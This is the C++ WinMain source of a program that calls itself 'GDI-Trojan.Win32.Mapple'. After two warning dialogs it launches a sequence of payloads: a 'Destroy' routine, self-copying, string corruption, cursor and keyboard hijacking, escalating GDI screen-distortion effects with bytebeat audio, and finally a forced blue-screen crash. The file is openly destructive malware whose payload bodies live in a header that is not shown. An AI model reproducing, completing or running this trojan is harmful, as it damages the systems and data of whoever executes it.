#include "Mapple.h"

int WINAPI WinMain
(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nShowCmd
)
{
	if
		(
			MessageBoxW
			(
				NULL,
				L"ATENTION!!!\n\nThis program is malicious. Do you want run?",
				L"'Minty sucks'",
				MB_ICONWARNING | MB_YESNO
			) != IDYES
			) return 1;

	if
		(
			MessageBoxW
			(
				NULL,
				L"LAST WARNING!!!\n\nAre you sure do you want to run?",
				L"GDI-Trojan.Win32.Mapple - FINAL WARNING",
				MB_ICONWARNING | MB_YESNO
			) != IDYES

			) return 1;

	
	CreatePayload(System::InitialPayloads);
	CreateBytebeat(Bytebeats::Sound1);
	System::CopyMappleFile();
	CreatePayload(System::Destroy);
	CreatePayload(System::FuckStrings);
	CreatePayload(System::MessageBoxes);
	CreatePayload(System::FuckCursorPosition);
	CreatePayload(System::PressKeys);
	CreatePayload(GDIPayloads::TrashBlur);
	Sleep(30000);
	CreateBytebeat(Bytebeats::Sound2);
	CreatePayload(GDIPayloads::Icons);
	CreatePayload(GDIPayloads::Texts);
	CreatePayload(GDIPayloads::DarkandBright);
	Sleep(30000);
	CreateBytebeat(Bytebeats::Sound3);
	CreatePayload(GDIPayloads::SquareWaveHSL);
	Sleep(30000);
	CreateBytebeat(Bytebeats::Sound4);
	CreatePayload(GDIPayloads::Blur);
	CreatePayload(GDIPayloads::SierspinskiHSL);
	Sleep(30000);
	CreateBytebeat(Bytebeats::Sound5);
	CreatePayload(GDIPayloads::Ors);
	CreatePayload(GDIPayloads::MovingRGB);
	Sleep(30000);
	CreateBytebeat(Bytebeats::Sound6);
	CreatePayload(GDIPayloads::PatBltEff);
	CreatePayload(GDIPayloads::BitBlts);
	Sleep(30000);
	System::ForceBSOD();
	Sleep(-1);
	//Sleep(INFINITE);
}